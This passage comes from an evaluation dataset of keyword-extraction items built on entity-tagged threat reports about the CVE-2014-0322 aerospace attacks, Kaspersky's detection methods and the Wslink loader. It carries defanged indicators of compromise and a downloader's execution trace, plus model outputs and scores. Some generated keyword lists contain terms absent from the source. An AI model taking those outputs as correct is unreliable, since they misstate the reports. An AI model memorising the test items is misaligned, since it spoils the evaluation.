WebAccess, the massive DDoS attack by the Mirai botnet, and the biggest data breach in history. The article aims to help enterprises understand the security risks they faced in 2016 and suggests security strategies to stay protected."]}, {"split_name": "val", "sample_id": "val_120", "prompt_text": "Extract the keywords: The French Connection : French Aerospace - Focused CVE-2014 - 0322 Attack Shares Similarities with 2012 Capstone Turbine Activity [DATE] 25 [DATE] FEB [DATE] 2014 [ORG] THE [ORG] ADVERSARY LINE - UPMATT DAHLTwo [DATE] weeks [DATE] ago , news broke about strategic web compromise ( SWC ) activity on the website for the [GPE] U.S. organization , [NORP] Veterans of Foreign Wars ( VFW ) . This activity leveraged exploit code for a zero - day vulnerability now identi\ufb01ed as CVE-2014 - 0322 and ultimately infected victims with   [PERSON] ZxShell malware . CrowdStrike Intelligence attributed this attack to the [ORG] AURORA [ORG] PANDA adversary ; however , the discovery of additional indicators revealed that another adversary was leveraging the same vulnerability to carry out targeted attacks [DATE] nearly [DATE] a [DATE] month before the [ORG] VFW attack occurred . This other activity appears to be focused on [NORP] French aerospace and shares similarities with a [DATE] 2012 [ORG] SWC campaign affecting the website of U.S.-based turbine manufacturer , [ORG] Capstone [ORG] Turbine . [ORG] GIFAS - Related [ORG] ActivityCrowdStrike [ORG] Intelligence became aware of this additional activity after learning of a malicious iframe located at [ORG] savmpet[.]com . The iframe redirected visitors to gifas[.]assso[.]net , which was hosting exploit code in [CARDINAL] two \ufb01les ( include.html and [ORG] Tope.swf ) as well as a malicious payload   ( Erido.jpg).Above are screenshots of the [ORG] savmpet[.]com webpage and part of the page source showing the date that it was last modi\ufb01ed and the iframe redirect . The content of the page was taken from the   website of the [NORP] French aerospace industries association , Groupement des industries fran\u00e7aises a\u00e9ronautiques et spatiales ( GIFAS ) . The [DATE] 17 [DATE] January [DATE] 2014 date on both the webpage and the page source shows that it was created [DATE] nearly [DATE] a [DATE] month before the [ORG] VFW attack occurredVictim exploitation occurred in the same manner as in the [ORG] VFW activity , but the payload was different . Instead of [PERSON] ZxShell malware connecting to [ORG] AURORA [ORG] PANDA - related infrastructure , it was a malware variant known as [PERSON] Sakula connecting to command - and - control ( C2 ) infrastructure at oa[.]ameteksen[.]com . [NORP] French Aerospace FocusThis attack \u2019s most obvious connection to [NORP] French aerospace is the content taken from the GIFAS website and the [ORG] GIFAS - based domain used to host the exploit code and payload gifas[.]assso[.]net . Several other domains were also pointed at this [ORG] IP during the same time frame , including [CARDINAL] two that contained the same content and malicious iframe as [ORG] savmpet[.]com , secure[.]safran - group[.]com , and icbcqsz[.]com . Of particular interest was secure[.]safran - group[.]com . [PERSON] Safran is a [GPE] France - based aerospace and defense company with a focus on the design and production of aircraft engines and equipment . The company owns the safran - group[.]com domain , and the fact that one of its subdomains was pointed at a malicious [ORG] IP address suggests that the adversary compromised [GPE] Safran \u2019s DNS.The [PERSON] Sakula malware used in this attack contained an unusual and interesting component that further indicates a focus on [NORP] French aerospace . As part of the infection process , it added a number of domains to the \u201c host \u2019s \u201d \ufb01le of victim machines . The snecma[.]fr domain belongs to the [NORP] Safran subsidiary , [ORG] Snecma , that designs and builds engines for civilian and military aircraft , and spacecraft . The domains listed appear to provide remote access to the company \u2019s employees and possibly [ORDINAL] third - party contractors . The purpose of this component is unclear . It does not map these domains to malicious [ORG] IP meant to send victims directly to adversary infrastructure for credential collection . [CARDINAL] One possibility is that it was meant to make the malware appear more legitimate . It has also been hypothesized that this was done to ensure [ORG] DNS connectivity to these particular domains ; however , it seems unlikely that victims would suffer signi\ufb01cant [ORG] DNS connectivity issues , which   means that adding this component to the malware for that purpose would be somewhat super\ufb02uous . It should be noted that no victim logs related to this attack were discovered , so it is unclear who the actual targets and victims were . Having the secure[.]safran - group[.]com domain pointed at a malicious [ORG] IP indicates that [GPE] Safran suffered a [ORG] DNS compromise , but no deeper network compromise was observed . It is possible that the adversary desired to target the [NORP] French aerospace and defense sectors broadly , or possibly organizations in these sectors globally . Similarities to 2012 [ORG] Capstone [ORG] Turbine SWC AttackIn [DATE] January [DATE] 2013 , it was reported that the website for U.S.-based turbine manufacturer , [ORG] Capstone [ORG] Turbine , had been compromised and was being used in a [ORG] SWC attack leveraging an exploit for the CVE-2012 - 4792 . There are [CARDINAL] three primary similarities between [ORG] the [ORG] Capstone [ORG] Turbine attack and the recent [NORP] French aerospace activity . The \ufb01rst , and most signi\ufb01cant , connection is the use of [PERSON] Sakula malware . In both campaigns ,    [PERSON] Sakula variants were installed on successfully exploited machines . In [ORG] Capstone [ORG] Turbine , the [ORG] web[.]vipreclod[.]com , and in the recent attack , the sample ( MD5 hash : does n\u2019t appear to be widespread , but it is not yet clear whether [CARDINAL] only [CARDINAL] one group uses it , and therefore its use alone does not necessarily indicate a particular adversary . Another similarity is that GIFAS - based malicious domains are related to each incident . In the more recent attack , the gifas[.]assso[.]net domain was used to host exploit code and the malicious payload . [ORG] The [ORG] Capstone [ORG] Turbine incident did not directly use a [ORG] GIFAS - based domain , but a deeper look at network indicators related to those observed in the [ORG] Capstone incident reveals [CARDINAL] two such domains : gifas[.]cechire[.]com and gifas[.]blogsite[.]org . The [ORDINAL] third similarity between the [CARDINAL] two is the use of zero - days . The exploit used in [ORG] Capstone [ORG] Turbine was a zero - day during the time it was active , just like the exploit used in the recent [NORP] French aerospace activity . This is a general similarity that does not create a de\ufb01nitive link   between the [CARDINAL] two attacks , but when viewed in conjunction with the use of the same malware and GIFAS - based domains , it strengthens the connection.\u2190 Mo \u2019 Shells Mo \u2019 Problems \u2013 File List StackingDetails about [ORG] Apple SSL vulnerability and iOS 7.0.6 patch \u2192Follow Us Tweets about \" from : crowdstrike OR from : Adam_Cyber OR from : JMDeC OR from : [ORG] DmitriCyber OR from : [ORG] StevenChabinsky OR from : [ORG] George_Kurtz\"Recent [ORG] PostsThe [ORG] Imperative [ORG] for [ORG] Proactive [ORG] Incident [ORG] Response in [DATE] 2015 and Beyond [DATE] November [DATE] 3 , 2015Why Your Business Environment Should Drive Cybersecurity [DATE] November [DATE] 2 , [CARDINAL] 2015Blurring of Commodity and Targeted Attack Malware [DATE] October [DATE] 16 , [ORG] 2015Should [ORG] I [ORG] Really [ORG] Trust [ORG] the [ORG] Cloud with my Endpoint Protection ? [DATE] September [DATE] 30 , 2015U.S. \u2013 China Agreement on Cyber Intrusions : An In\ufb02ection Point   [DATE] September [DATE] 25 , 2015ArchivesM29162330 \u00ab [PRODUCT] OctN [PRODUCT] O [PRODUCT] V [PRODUCT] E [PRODUCT] M [PRODUCT] B [PRODUCT] E [PRODUCT] RT3101724T5121926F6132027W41118252S7142128015S 18152229Recent Comments", "generated_text": "French aerospace; the VFW; the website; GIFAS; CVE-2014-0322; a zero-day vulnerability; CVE-2014-0322; ZxShell; victims; a malware variant; Sakula; command-and-control infrastructure; domains; the malware; a focus; a French aerospace company; a focus; the design; engine; spacecraft; The malware; similarities; the VFW attack; 2012; the French Connection; the GIFAS website; the malware; a malicious iframe; a malicious iframe; a payload; the attackers; a focus; French aerospace; a focus; cybercriminals.", "ref_text": "<START-1>The document analyzes a cyberespionage campaign targeting the French aerospace industry in early 2014. The attackers exploited the CVE-2014-0322 vulnerability using a strategic web compromise to infect victims with Sakula malware. The malware and infrastructure showed connections to French aerospace companies like Safran. The attackers compromised a Safran subdomain and DNS records. The Sakula malware also modified hosts files to include internal Snecma domains. This attack shares tactics, techniques, and procedures with a 2012 campaign that compromised the website of US turbine manufacturer Capstone Turbine. Both used the Sakula malware, exploited zero-days, and involved domains referencing the French aerospace association GIFAS. While the victims are unknown, the indicators point to a focused campaign against French aerospace entities potentially for cyberespionage. The report highlights the importance of securing public-facing websites and DNS infrastructure against state-sponsored threats. Proactive monitoring for strategic web compromises and malware is recommended. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5089820359281437, "gpt3/lexical/rouge_rouge2": 0.16867469879518074, "gpt3/lexical/rouge_rougeL": 0.2335329341317365, "gpt3/lexical/rouge_rougeLsum": 0.2335329341317365, "gpt3_generated_text": ["This article discusses a recent cyber attack on the website of the U.S. organization, Veterans of Foreign Wars (VFW), which leveraged a zero-day vulnerability known as CVE-2014-0322. The attackers infected victims with ZxShell malware, and the attack was attributed to the AURORA PANDA adversary. However, further investigation revealed that another adversary had been leveraging the same vulnerability to carry out targeted attacks on the French aerospace industry. The attackers used a malicious iframe on the website of the French aerospace industries association, GIFAS, and redirected visitors to a domain hosting exploit code and a payload. The payload was a malware variant known as Sakula, which connected to command-and-control infrastructure. The attack also involved compromising the DNS of Safran, a French aerospace and defense company, indicating a specific focus on the French aerospace sector. The article also mentions similarities to a 2012 strategic web compromise attack on the website of Capstone Turbine, a U.S.-based turbine manufacturer. Overall, the article highlights the targeted nature of the cyber attacks on the French aerospace industry and the potential global implications."]}, {"split_name": "val", "sample_id": "val_121", "prompt_text": "Extract the keywords: [ORG] ExpertiseHow do [ORG] Kaspersky [ORG] \u2019s advanced algorithms ensure the best protection for your business against cyber threats?Learn more on kaspersky.comContentsOur Classical Approach to [ORG] Automatic DetectionHeuristics - [ORG] Based [ORG] Approach [ORG] to Automatic DetectionBehavior DetectionSandboxes , [ORG] KSN and \u2026 [ORG] PeopleSmart [ORG] Records Anti - Virus [ORG] Records [ORG] Based on Decision Trees Locality - Sensitive HashingThe Malware Path Keeping False Positives at Bay23445 8Machine Learning and Human ExpertiseEvery year , the quality of our protection wins [PERSON] Kaspersky more awards than anyone else in the cybersecurity industry . This achievement would be impossible without the fusion of a global big data \u2018 cyberbrain \u2019 powered by machine learning algorithms and the unequalled expertise of our security teams in combating \u2018 next - gen \u2019 threats . We offer you a \u2018 sneak peek \u2019 into the heart of [ORG] Kaspersky [ORG] \u2019s anti- malware infrastructure , revealing our algorithms and their role in fighting the most dangerous threats to businesses like yours . \u00abHow do [ORG] Kaspersky [ORG] \u2019s advanced algorithms ensure the best protection for your business against cyber threats?\u00bbOur Classical Approach to [GPE] Automatic DetectionOur virus collection contains samples of detectable threats grouped by detection names , e.g. Backdoor.Win32.Hupigon.abc . When a new , undetected sample arrives , we begin by searching our collection for similar samples . The search principle is roughly the same as that used by Google Search . The only difference is that Google Search is word - based , while our searches are based on file features . In the simplest scenario , if the sample has been unpacked successfully we can extract the strings responsible for the malware functionality and use them in much the same way as keywords are used by a search engine . At [PERSON] Kaspersky we have an automated system that handles both the analysis of files and the automatic classification of threats . Google service that searches for similar pictures on the Internet.2This system sorts the inbound stream of samples while simultaneously adding hashes to identify and define detections . [CARDINAL] One simple hash record covers the detection of just one file , but in this way we can be sure there will be no \u2018 false positives\u2019 . When malware for which the collection contains no similar samples turns up , we know that this is either something completely new , or that it \u2019s not malware at all . This is where the expertise of human AV Analysts comes into play . By unpacking and detecting a sample , the analyst creates a sort of \u201c center of gravity \u201d in the collection . Over time , other modified versions of the new sample will automatically gravitate towards this reference point . Heuristics - [ORG] Based [ORG] Approach [ORG] to Automatic DetectionExclusively hash - based detection only gets you so far : [CARDINAL] one slight file modification ( e.g. a single byte added at the end ) , and the whole file becomes undetectable again . That \u2019s why we unleash our heuristics - based automatic detection system on the whole family of our malware samples ( like Backdoor.Win32.Hubigon.abc etc ) . With the help of an emulator , the heuristics - based system creates execution logs of all the samples , finds their common execution patterns and creates a single execution - based heuristic record . The benefit of this approach is that new malware samples exhibiting similar behavior will be detected , even if the content includes some changes . Let \u2019s take a closer look at the process by which heuristic detection records are created . The robotic system uses machine learning to extract key execution sequences . The machine does n\u2019t know or care what particular purpose any sequence of commands serves . As far as it \u2019s concerned , it \u2019s enough to know that this or that execution sequence \u2013 or combination of sequences \u2013 is characteristic of some malware family and could not occur in any clean file . After some iterations , the most effective indicators and their combinations are automatically consolidated into records . Unlike this robot , an experienced human analyst can understand exactly what the sample is up to , despite any attempts to shake the heuristic system \u2019s emulator off its trail . So he or she can write a record straight away , highlighting obvious malware - like behavior . These [CARDINAL] two different approaches tend to work in parallel , particularly when automatic detection results are inconclusive and an expert [ORDINAL] second opinion is needed . Robotic and human - made records then work in tandem , ensuring successful detection . To evade detection , the malefactor may change the functionality of his or her malware . But there are limitations . Let \u2019s assume the malware has basic functionality : downloading a file via a malicious link , saving the file to disk and starting it ( Trojan- Downloader ) . There are [CARDINAL] no [CARDINAL] more [CARDINAL] than [CARDINAL] 10 programmatic ways to download anything from the internet , and [CARDINAL] no [CARDINAL] more [CARDINAL] than [CARDINAL] five ways to start an executable file . When the malefactor has tried them all and found that every method is detected , their best option is probably to give up and instead mount an attack against a business with no security solution , or a solution lacking execution analysis tools . [ORG] KERNEL32!LoadLibrary(0x004020B6 \u201c [ORG] KERNEL32.dll \u201d ) ; [PERSON] KERNEL32!GetTickCount ( ) ; KERNEL32!LoadLibrary(0x00403000 \u201c kernel32.dll \u201d ) ; KERNEL32!LoadLibrary(0x0040302C \u201c urlmon.dll \u201d ) ; urlmon!URLDownloadTofile(,0x00403061 \u201c http \u201d , 0x004030C5 \u201c c KERNEL32!Sleep ( ) KERNEL32!DeleteFile(0x004030C5 \u201c c:\\\\boot.bak \u201d ) ; urlmon!URLDownloadTofile(,0x0040308F \u201c http \u201d , 0x004030B9 \u201c c:\\\\4Trojan - Downloader . Win32.Small.aon execution log3Inject into a processStart a process Read the registry [PERSON] Download object from URL2 * = MALICIOUS!The malefactor may have another trick up their sleeve : knowing the emulation specifics , they can try to disrupt the emulation process by , for example , inserting long execution delays or asking for system parameters the emulator ca n\u2019t provide . While some of these tricks can themselves be treated as indicators for detection , we can nonetheless detect the sample \u2019s true functionality through a further method \u2013 using System Watcher , a system that monitors a process \u2019s activities within the actual operating system . Behavior DetectionUnlike the emulator , this component is a true behavioral detection system based on logs of real - life sample executions , so it \u2019s impossible to fool . It has its own set of behavioral records , which in many ways resemble those of the emulator - based detection system . The scope of logging performed by [ORG] Behavior [ORG] Detection is considerably wider than is possible during emulation . And , unlike the latter process , this logging has unlimited timeframes : everything suspicious encountered within a given context is considered and cached until enough evidence for detection has been gathered . If malicious activity is detected , the action is simply rolled back . As with the emulation system , [ORG] Behavior [ORG] Detection has its role in both on - premise detection and as a part of our in - lab wizardry . Incidentally , Behavior Detection activity is transparent and has no adverse impact on the process being monitored . Continuous on - premise behavioral analysis creates an extremely powerful detection layer , but unleashing the power of [ORG] Kaspersky infrastructure to execute suspicious files , study their behavior and detect threats via a fast response threat input database such as [ORG] KSN ( [ORG] Kaspersky [ORG] Security [ORG] Network ) is even more effective . Sandboxes , [ORG] KSN and \u2026 [NORP] PeopleWe continuously test samples \u2013 both known malicious and unknown \u2013 in our internal behavioral [PERSON] Sandbox systems . Some of these Sandboxes mimic user systems running standard products , while the most powerful have tremendously granular logging capabilities , allowing extremely fine - tuned detection . The [PERSON] Sandbox logs , along with Behavior Detection execution statistics received from [ORG] KSN \u2019s voluntary participants , are processed by both robots and human experts . Robots run [CARDINAL] two important processes : the logs of new malicious samples \u2019 execution are studied using [ORG] Machine [ORG] Learning to find new detection indicators \u2013 and unknown samples are also detected , with static records created for subsequent use both in our infrastructure and on customers \u2019 premises . So even if malware creators are resourceful enough to sidestep the majority of the on - premise detection layers \u2013 usually through extensive reconnaissance and preliminary testing \u2013 they \u2019ll be no better off in the end . Meanwhile , using robot - distilled indicators , human experts create effective behavioral records similar to those based on emulated execution , but with a very much wider range of indicators to utilize.4Smart [ORG] RecordsThe list of Machine learning - based processes does n\u2019t end with the above . There are further robotic detection layers capable of detecting sizable families of malware . Usually we call these \u2018 Smart Records\u2019 . Anti - Virus [ORG] Records [ORG] Based on Decision Trees The in - lab robotic part of this system analyzes the same collection of samples as above , and creates or improves records based on decision trees . This makes it possible to separate files into classes and to specify criteria sensitive to the features of those files . How does this work ? Let \u2019s look at an example based on the [PERSON] Iris flower data set , a typical test case for statistical classification techniques . Say we have [CARDINAL] 150 flowers : [CARDINAL] 50 samples each of [ORG] Iris [ORG] Setosa , [PERSON] Iris [PERSON] Virginica and [PERSON] Iris [PERSON] Versicolor . To simplify the task , let [GPE] \u2019s take the [CARDINAL] two most informative features of these flowers : petal length ( PL ) and petal width ( PW ) . Plotting the features of each sample provides data that can be used to create a decision tree which can then allocate [CARDINAL] one of the [CARDINAL] three classes to each new [ORG] Iris sample through \u2018 request - response \u2019 , like this : Our AV engine uses exactly the same kind of tree . Each decision tree is carefully fine- tuned and delivered to the user . The selected features of an individual file running on the user \u2019s computer are extracted and run through each decision tree . The tree then uses the responses to decide whether or not the file is malicious . PL < 2.501PW > 1.68setosa0PL > 51virginica01versicolorvirginicaPetal length , PL 7,06,56,05,55,04,54,03,53,02,52,01,51,000,2 0,4 0,6 0,81,01,21,41,61,82,02,42,2 [CARDINAL] 2,6 [ORG] Petal width , PWAxes of the [CARDINAL] 2 most informative attributes ( of [CARDINAL] 4 ) [CARDINAL] two classes splitted accurately , [CARDINAL] 3 mistakes in [ORDINAL] 3rd class . Source : Coursera / [ORG] YandexThe advantage of this approach is its generalizing capabilities : each tree is created in our infrastructure based on a subset of the samples we have , but on users \u2019 computers the tree will also detect any samples not yet acquired by our researchers . For example , in the picture above , any dot in the red zone will be detected as [PERSON] Iris [PERSON] Setosa . A single tree - based record replaces an average of a [CARDINAL] thousand hash records . Machine learning is indispensable to creating decision trees . While an expert can feed long lists of features to the robot , experts do n\u2019t create tree - based records on their own . Only a machine can extract and apply the data , selecting the best features and , most importantly , creating decision rules based on these features . The human expert just monitors the result and controls the process.5Locality - Sensitive Hashing Tree - based detection models are great but still have [CARDINAL] one major shortcoming : while being created automatically in our internal infrastructure , they can only operate effectively on the host ( user \u2019s computer ) where the particular file is studied . A cloud system based on this principle would create considerable network traffic , which is undesirable in most cases . Hash - based cloud systems , by contrast , are considerably lighter in terms of traffic . But a typical cryptographic hash , such as MD5 or SHA256 for example , nearly always corresponds to [CARDINAL] one file only . It \u2019s good that you wo n\u2019t find a [ORDINAL] second file with the same hash ; false positives are out of the question here . But it would be great having a hash that \u2019s the same for all malware belonging to the same family . In other words , insignificant file modifications would not affect the hash . This is in fact possible with so - called LSH , or Locality - Sensitive [ORG] Hashing . Requests resulting in detections based on this hash can be made via the cloud . Cryptographic hash(hash values)Very similar \ufb01lesSimilar \ufb01lesNon - similar [WORK_OF_ART] \ufb01lesMachine [WORK_OF_ART] Learning : locality sensitive hashingLocality sensitive hash(hash values)How do we calculate levels of similarity between files ? Consider the following example . Assume that File A is characterized by the following numerical features : [CARDINAL] 31 , [DATE] 83 , [DATE] 98 , [DATE] 86 , [CARDINAL] 183 , [DATE] 79 , [DATE] 67 , [CARDINAL] 153 , [DATE] 77 , [CARDINAL] 67Meanwhile , File B is slightly different : [CARDINAL] 27 , [DATE] 89 , [DATE] 93 , [DATE] 81 , [CARDINAL] 190 , [DATE] 71 , [DATE] 67 , [CARDINAL] 161 , [DATE] 75 , 69All numbers can be \u201c rounded down \u201d by dividing them by [CARDINAL] 10 . We get : File A : [CARDINAL] 3 , [DATE] 8 , [DATE] 9 , [DATE] 8 , [DATE] 18 , [DATE] 7 , [DATE] 6 , [DATE] 15 , [DATE] 7 , 6 File B : [CARDINAL] 2 , [DATE] 8 , [DATE] 9 , [DATE] 8 , [DATE] 19 , [DATE] 7 , [DATE] 6 , [DATE] 16 , [DATE] 7 , 6As you can see , the feature values are almost identical now . Here \u2019s another approach : calculate the arithmetic mean of numbers in the [ORDINAL] first and [ORDINAL] second halves of each of the [CARDINAL] two files above . The answer turns out to be : File A : [CARDINAL] 96 , [CARDINAL] 88 File B : [CARDINAL] 96 , 88In this case , the [ORG] LSH hashes are identical . The challenging aspect of this approach involves choosing features that vary slightly within the same malware family , but which are still different enough to be recognized where a specific clean file is concerned . These features then need to be \u201c quantized \u201d ( simply put , they are processed so that their precision is reduced ) . As you may have guessed , only a robot can do this . But the task is still formulated by a human expert.6The [PERSON] Malware [PERSON] PathOut of [CARDINAL] 10,000 \u201c new\u201dsamples , this is the sort of scenario we might [ORG] expect.9,900 will have been detected by smart records ( like locality- sensitive hashes and records based on decision [CARDINAL] trees).Out of the remaining [CARDINAL] 100 samples,65 are detected on execution , using System Watcher \u2019s behavioral detection . Of the remaining [CARDINAL] 35 samples,32 are detected automatically in - lab , based on similarities to the samples from our malware collection . The [CARDINAL] three remaining by [NORP] an [NORP] AV [NORP] Analyst . All samples ( regardless of how they made it into the collection ) are frequently re - analyzed for any new detections using generalization technologies ( previously described heuristic autorecords / tree - based records / locality - sensitive hash records ) . If a sample was previously detected using only the individual hash , the detection is \u201c generalized \u201d by machine learning , so it \u2019s included into some big \u2018 family \u2019 of malware described only by a single record . After that , the individual hash record is deleted.7Keeping False Positives at [FAC] Bay [FAC] The story of [WORK_OF_ART] Machine [WORK_OF_ART] Learning - powered heuristic detection would not be complete without mentioning the issue of false positives . As with any method based on the generalization principle , these techniques contain the inherent potential for mistakes , resulting in false positive detections . Unexpected shifts in the threat landscape can increase the probability of this happening , so , as well as the continuous constant adjustment of detection models , constant and very tight control over false positives is required . Kaspersky products incorporate automated mechanisms for the tracking , timely switch - off and correction of faulty records . But , following the principle of multi- layeredness in everything and the best possible outcome for customers , all the records , including those created by robots , are under constant scrutiny from the most experienced analysts . They make sure that the records are thoroughly tested and adjusted at appropriate intervals , to ensure the highest possible detection rates while keeping the number of false positives as [CARDINAL] close [CARDINAL] to [CARDINAL] zero as possible . As independent tests consistently prove , they are extremely good at this!All the technologies and approaches described here are instrumental in achieving True Cybersecurity \u2013 but we \u2019re always inventing new ones , to keep every next generation of threats at bay.8.IIS [CARDINAL] 2Enterprise Cybersecurity : www.kaspersky.com/enterprise TechnoWiki : www.kaspersky.com/technowiki IT Security News : www.kaspersky.com/blog [WORK_OF_ART] Cyber [WORK_OF_ART] Threats [WORK_OF_ART] News : www.securelist.comwww.kaspersky.com", "generated_text": "Kaspersky; Machine Learning; detection; malware samples; detection names; Backdoor.Win32.Hupigon.abc; hashes; detections; the malware; Virus; a robot; APT; human expertise; machines; time; detections; the malware; the inbound stream; samples; a type; hashes; locality; Sensitive Hashing; the heuristics; prediction trees; the detection; the malware; GitHub; BitFish; the analysis; a system; this approach; over a dozen; variants; an example; Google; the same malware; at least four years; the law; the quality; trust.", "ref_text": "<START-1>Here is a summary of the key points from the PDF document on Kaspersky's machine learning and human expertise for cybersecurity protection: The PDF outlines how Kaspersky combines automated machine learning algorithms with human expertise to provide effective cybersecurity protection. It describes several of the automated detection methods used by Kaspersky, including: - Classical signature-based detection that searches for similar malware samples in Kaspersky's database. New undetected samples are manually analyzed by experts to create detection signatures that can identify variants. - Heuristics-based detection that looks for common execution patterns across malware samples to create generalized detection rules. This can catch variants even if code is modified. - Behavior detection that monitors real-world execution for suspicious activities. It has unlimited timeframes to gather evidence before determining a detection. - Sandboxing executes suspicious files and studies behavior using granular logging. Machine learning analyzes the logs to find indicators and create detection records. Experts also craft custom behavioral records. - Smart records like decision trees and locality-sensitive hashing generalize detections across malware families using machine learning. They replace individual signature records. - Automatic in-lab systems handle initial analysis and classification. But human experts investigate ambiguous cases and emerging threats. Their expertise guides machine learning and creates behavioral records. - Multi-layered on-device and cloud-based protections work together. Lightweight cloud queries minimize traffic while still detecting variants. - False positives are tightly controlled through automated tracking of faulty records and human review. Experts continuously tune detection models and validate record performance. The combination of advanced machine learning and human expertise allows Kaspersky to provide cutting edge protection able to react to new threats without compromising accuracy. But new technologies are continually developed to stay ahead of evolving attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.48484848484848486, "gpt3/lexical/rouge_rouge2": 0.08745247148288973, "gpt3/lexical/rouge_rougeL": 0.17803030303030304, "gpt3/lexical/rouge_rougeLsum": 0.17803030303030304, "gpt3_generated_text": ["Kaspersky utilizes advanced algorithms, including machine learning, to ensure optimal protection against cyber threats for businesses. Their classical approach to automatic detection involves searching their virus collection for similar samples when a new, undetected sample arrives. This search is based on file features, similar to how Google Search is word-based. If the sample has been unpacked successfully, its strings responsible for malware functionality are extracted and used as keywords for detection. Kaspersky's automated system handles file analysis and classification, adding hashes to identify and define detections. When a completely new or non-malware sample is detected, human AV analysts unpack and detect the sample, creating a reference point for future detections. Kaspersky also employs a heuristics-based approach to automatic detection, using an emulator to create execution logs of malware samples. By identifying common execution patterns, a single execution-based heuristic record is created. This approach allows for the detection of new malware samples with similar behavior, even if there are some changes in their content. Human analysts can provide a second opinion and write records based on their expertise, collaborating with the robotic system for successful detection. Despite attempts by malicious actors to evade detection by changing the functionality of their malware, there are limitations to the number of ways to download files from the internet or start executable files. Kaspersky's combination of machine learning algorithms and human expertise has earned them numerous awards in the cybersecurity industry."]}, {"split_name": "val", "sample_id": "val_122", "prompt_text": "Extract the keywords: Wslink : Unique and undocumented malicious loader that runs as a serverwelivesecurity.com/2021/10/27/wslink-unique-undocumented-malicious-loader-runs-serverOctober 27 , [CARDINAL] 2021ESET researchers have discovered a unique and previously undescribed loader for [PRODUCT] Windows binaries that , unlike other such loaders , runs as a server and executes received modules in memory . We have named this new malware [GPE] Wslink after [CARDINAL] one of its DLLs . We have seen only a few hits in our telemetry in [DATE] the [DATE] past [DATE] two [DATE] years , with detections in [LOC] Central [LOC] Europe , [LOC] North [LOC] America , and [LOC] the [LOC] Middle [LOC] East . The initial compromise vector is not known ; most of the samples are packed with MPRESS and some parts of the code are virtualized . Unfortunately , so far we have been unable to obtain any of the modules it is supposed to receive . There are no code , functionality or operational similarities that suggest this is likely to be a tool from a known threat actor group . The following sections contain analysis of the loader and our own implementation of its client , which was initially made to experiment with detection methods . This client \u2019s source code might be of interest to beginners in malware analysis \u2013 it shows how one can reuse and interact with existing functions of previously analyzed malware . The very analysis could also serve as an informative resource documenting this threat for blue teamers . Technical analysisWslink runs as a service and listens on all network interfaces on the port specified in the [ORG] ServicePort registry value of the service \u2019s Parameters key . The preceding component that registers the Wslink service is not known . Figure [CARDINAL] 1 depicts the code accepting incoming connections to that port.1/8Figure [CARDINAL] 1 . Hex - Rays decompilation of the loop accepting incoming connectionsAccepting a connection is followed by an [ORG] RSA handshake with a hardcoded [CARDINAL] 2048 - bit public key to securely exchange both the key and IV to be used for 256 - bit AES in CBC mode ( see Figure [CARDINAL] 2 ) . The encrypted module is subsequently received with a unique identifier \u2013 signature \u2013 and an additional key for its decryption . Interestingly , the most recently received encrypted module with its signature is stored globally , making it available to all clients . One can save traffic this way \u2013 transmit only the key if the signature of the module to be loaded matches the previous one.2/8Figure [CARDINAL] 2 . Hex - Rays decompilation of receiving the module and its signatureAs seen in Figure [CARDINAL] 3 , the decrypted module , which is a regular [ORG] PE file , is loaded into memory using the [ORG] MemoryModule library and its [ORDINAL] first export is finally executed . The functions for communication , socket , key and IV are passed in a parameter to the export , enabling the module to exchange messages over the already established connection.3/8Figure [CARDINAL] 3 . Hex - Rays decompilation of code executing the received module in memoryImplementation of the clientOur own implementation of a Wslink client , described below , simply establishes a connection with a modified Wslink server and sends a module that is then decrypted and executed . As our client can not know the private key matching the public key in any given Wslink server instance , we produced our own key pair and modified the server executable with the public key from that pair and used the private key in our [GPE] Wslink client implementation . This client enabled us to reproduce [ORG] Wslink \u2019s communication and search for unique patterns ; it additionally confirmed our findings , because we could mimic its behavior . Initially some functions for sending / receiving messages are obtained from the original sample ( see Figure [CARDINAL] 4 ) \u2013 we can use them right away and do not have to reimplement them later . Figure [CARDINAL] 4 . The code for loading functions from a Wslink \u2019s sample4/8Subsequently , our client reads the private [ORG] RSA key to be used from a file and a connection to the specified [ORG] IP and port is established . It is expected that an instance of [GPE] Wslink already listens on the supplied address and port . Naturally , its embedded public key must also be replaced with one whose private key is known . Our client and the Wslink server continue by performing the handshake that exchanges the key and IV to be used for AES encryption . This consists of [CARDINAL] three steps , as seen in Figure [CARDINAL] 5 : sending a client hello , receiving the symmetric key with IV , and sending them back to verify successful decryption . From reversing the Wslink binary we learned that the only constraint of the hello message , apart from size [CARDINAL] 240 bytes , is that the [ORDINAL] second byte must be [CARDINAL] zero , so we just set it to all zeroes . Figure [CARDINAL] 5 . Our client \u2019s code for the [ORG] RSA handshakeThe final part is sending the module . As one can see in Figure [CARDINAL] 6 , it consists of a few simple steps : receiving the signature of the previously loaded module \u2013 we decided not to do anything with it in our implementation , as it was not important for us sending a hardcoded signature of the module reading the module from a file , encrypting it ( see Figure [CARDINAL] 7 ) and sending it sending the encryption key of the module5/8Figure [CARDINAL] 6 . Our client \u2019s code for sending the moduleFigure 7 . Our client \u2019s code for loading and encrypting the moduleThe full source code for our client is available in our [PRODUCT] WslinkClient [PRODUCT] GitHub repository . Note that the code still requires a significant amount of work to be usable for malicious purposes and creating another loader from scratch would be easier.6/8ConclusionWslink is a simple yet remarkable loader that , unlike those we usually see , runs as a server and executes received modules in memory . Interestingly , the modules reuse the loader \u2019s functions for communication , keys and sockets ; hence they do not have to initiate new outbound connections . Wslink additionally features a well - developed cryptographic protocol to protect the exchanged data . IoCsSamplesSHA-1ESET detection name01257C3669179F754489F92947FBE0B57AEAE573 Win64 / [ORG] TrojanDownloader . [CARDINAL] WslinkE6F36C66729A151F4F60F54012F242736BA2486239C4DE564352D7B6390BFD50B28AA9461C93FB32MITRE ATT&CK techniquesThis table was built using version [CARDINAL] 9 of the [PERSON] ATT&CK framework . TacticEnterpriseIDNameDescriptionT1587.001 Develop Capabilities : MalwareWslink is a custom [ORG] PE loader . ExecutionT1129Shared [ORG] ModulesT1569.002 [ORG] System Services : Service ExecutionWslink loads and executes DLLs in memory . Wslink runs as a service . Obfuscated ControlT1027.002 Obfuscated Files orInformation : Software PackingWslink is packed with [ORG] MPRESS and its code might be virtualized . [ORG] T1573.001 [ORG] Encrypted [ORG] Channel : Symmetric CryptographyT1573.002 Encrypted Channel : Asymmetric CryptographyWslink encrypts traffic with AES.Wslink exchanges a symmetric key with RSA.7/88/8", "generated_text": "the malware; Wslink; DLL; a server; networks; the port; the service; a 